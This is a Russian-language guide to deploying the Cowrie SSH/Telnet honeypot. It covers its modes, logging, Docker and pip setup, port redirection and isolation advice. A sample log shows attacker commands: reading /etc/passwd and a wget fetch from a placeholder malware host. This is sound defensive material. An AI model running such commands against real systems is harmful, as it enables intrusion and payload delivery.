# 🍯 Cowrie — SSH/Telnet honeypot

[**Cowrie**](https://github.com/cowrie/cowrie) — приманка (honeypot), которая притворяется уязвимым SSH/Telnet-сервером. Атакующий думает, что нашёл цель, подключается и перебирает пароли, а Cowrie записывает его IP, логины, пароли, команды и скачанные файлы. Это пассивная разведка: вы ничего не атакуете, только собираете данные о тех, кто ломится к вам. Заметка по посту канала CodeGuard (PySec Edition), сверена с репозиторием и документацией.

## 1. Два режима

- **Medium interaction (shell, по умолчанию).** Cowrie **эмулирует** оболочку UNIX на Python. Атакующий «ходит» по фальшивой файловой системе, его команды разбираются и логируются, но настоящей системы под ним нет. Это безопасный режим: до реального shell добраться нельзя.
- **High interaction (proxy).** Cowrie работает прокси к настоящему SSH/Telnet-серверу (или к пулу одноразовых QEMU-ВМ) и наблюдает за реальной сессией. Данных больше, но и риск выше: за прокси стоит живая система, которую нужно жёстко изолировать.

Для «поймать ботов и посмотреть, что перебирают» достаточно режима по умолчанию.

## 2. Что записывает

- Все попытки входа: логин и пароль, которые перебирает атакующий.
- Команды, которые он выполняет в фальшивой оболочке.
- Файлы, которые он пытается скачать (`wget`, `curl`): сохраняются в `var/lib/cowrie/downloads/` для анализа.
- Полную запись сессии (TTY) — её можно проиграть как видео утилитой `playlog`.
- **Логи:** текстовый `var/log/cowrie/cowrie.log` и структурный `cowrie.json` — последний удобно отдавать в SIEM (ELK, Loki, Splunk). Есть плагины вывода в базы, Fail2ban, Telegram и т. д.

## 3. Запуск в Docker

Самый простой способ — готовый образ с Docker Hub. Клонировать репозиторий для этого **не нужно** (в посте `git clone` перед `docker run` лишний: образ тянется с хаба, а не из клона):

```bash
docker run -d --name cowrie -p 2222:2222 cowrie/cowrie
docker logs -f cowrie        # живой поток: подключения, логины, команды
```

Пример того, что видно в логах:

```text
New connection: 185.234.72.11:54321
login attempt [root/123456] failed
CMD: cat /etc/passwd
CMD: wget http://malware.example/bot.sh
```

**Сохраняйте данные между перезапусками.** Контейнер из команды выше одноразовый: удалите его — и логи, скачанные образцы и SSH-ключ хоста пропадут. А меняющийся при каждом старте ключ хоста выдаёт приманку. Поэтому примонтируйте тома:

```bash
docker run -d --name cowrie -p 2222:2222 \
  -v "$PWD/cowrie-etc:/cowrie/cowrie-git/etc" \
  -v "$PWD/cowrie-var:/cowrie/cowrie-git/var" \
  cowrie/cowrie
```

| Система | Контейнерный движок (или pip) |
| :--- | :--- |
| Debian / Ubuntu | `sudo apt install docker.io` — или pip-установка (ниже) |
| Gentoo | `emerge --ask app-containers/docker` |
| Arch | `sudo pacman -S docker` |
| Entware | не подойдёт: Python + Twisted + cryptography тяжелы для роутера |

Без Docker — через `pip` в виртуальном окружении (одинаково на Debian/Ubuntu, Gentoo, Arch; нужен Python 3 и `git`):

```bash
mkdir ~/my-honeypot && cd ~/my-honeypot
python3 -m venv cowrie-env && . cowrie-env/bin/activate
pip install cowrie
cowrie init          # создаёт ./etc/cowrie.cfg
cowrie start         # логи — в ./var/log/cowrie/
```

## 4. Порт: 2222 против 22

Cowrie по умолчанию слушает **2222** — непривилегированный порт, чтобы не мешать настоящему SSH и не требовать root. Сканеры, которые перебирают все порты, зацепят и 2222. Но основная масса брут-форса идёт на **22**, поэтому его перенаправляют на приманку:

```bash
# настоящий SSH заранее перевесить на другой порт (например 22022) и пускать только по ключу
sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
```

## 5. Как не подставиться

Приманка — это сервис, который **намеренно** атакуют, поэтому главное правило: взлом приманки не должен ничего вам стоить.

- **Изоляция.** Ставьте honeypot на отдельной ВМ или хосте в сегменте сети, из которого **нельзя дойти до продакшена и личных данных**. На самой приманке — никаких реальных ключей, паролей и доступов.
- **Режим по умолчанию.** Medium-interaction безопаснее: атакующий работает в эмуляции и до настоящей оболочки не доберётся. Proxy/high-interaction включайте только при жёсткой изоляции бэкенда.
- **Не расширяйте поверхность.** Не пробрасывайте в контейнер сокет Docker, не открывайте лишних портов, запускайте от непривилегированного пользователя (образ так и делает).
- **Скачанные образцы — это вредонос.** Файлы в `downloads/` не запускайте, храните и анализируйте как malware (отдельная песочница).
- **Право.** Логировать атакующих на своей инфраструктуре законно. Ответные атаки (hack-back), заманивание к действиям, которых человек не совершил бы сам, — нет. Приманку ставьте только в своей сети.
